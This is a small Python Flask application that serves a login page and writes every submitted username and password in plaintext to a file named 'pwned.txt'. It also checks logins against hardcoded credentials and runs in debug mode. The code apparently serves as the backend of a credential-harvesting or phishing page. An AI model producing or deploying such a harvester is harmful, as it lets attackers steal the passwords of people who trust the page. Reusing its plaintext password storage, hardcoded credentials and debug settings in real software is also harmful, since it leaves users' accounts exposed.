from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Serve the index page
@app.route('/')
def index():
    return render_template('index.html')

# Serve the login page
@app.route('/login.html')
def login():
    return render_template('login.html')

# Handle the login credentials submission
@app.route('/login', methods=['POST'])
def handle_login():
    # Get username and password from the form submission
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the credentials to a local file
    with open('pwned.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

    # For demonstration purposes, validate credentials
    if username == 'admin' and password == 'password123':
        return jsonify({'message': 'Login successful!'}), 200
    else:
        return jsonify({'message': 'Invalid credentials. Please try again.'}), 400

if __name__ == '__main__':
    app.run(debug=True)
